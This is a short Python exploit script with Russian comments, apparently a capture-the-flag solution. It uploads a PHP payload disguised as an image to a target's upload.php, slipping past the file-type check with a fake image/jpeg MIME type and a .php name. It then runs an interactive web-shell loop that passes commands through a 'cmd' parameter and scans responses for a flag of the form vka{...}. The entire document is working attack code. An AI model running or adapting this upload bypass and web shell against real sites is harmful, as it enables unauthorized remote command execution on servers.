import requests,sys,re

s = requests.Session()
url = sys.argv[1]
# отправляем файл на сервер
with open('payload_file.png', 'rb') as f:
    img = f.read()
res = s.post(f'{url}/upload.php', files={
     "fileToUpload": (f"ksbbnkajbneqkrvnavrnljanrvkanrvkjnrknakjbjnkjab.php", img, "image/jpeg")})
print(res.text)
#веб шел
while True:
    cmd = input('введи команду:')     
    res = s.get(f'{url}/uploads/ksbbnkajbneqkrvnavrnljanrvkanrvkjnrknakjbjnkjab.php?cmd={cmd}')
    if (re.search("vka\{.*\}",res.text)):
        flag = re.findall("vka{.*}",res.text)
        print(flag)
        break
    else:
        print(re.findall("[a-z0-9._]{4,}",res.text))
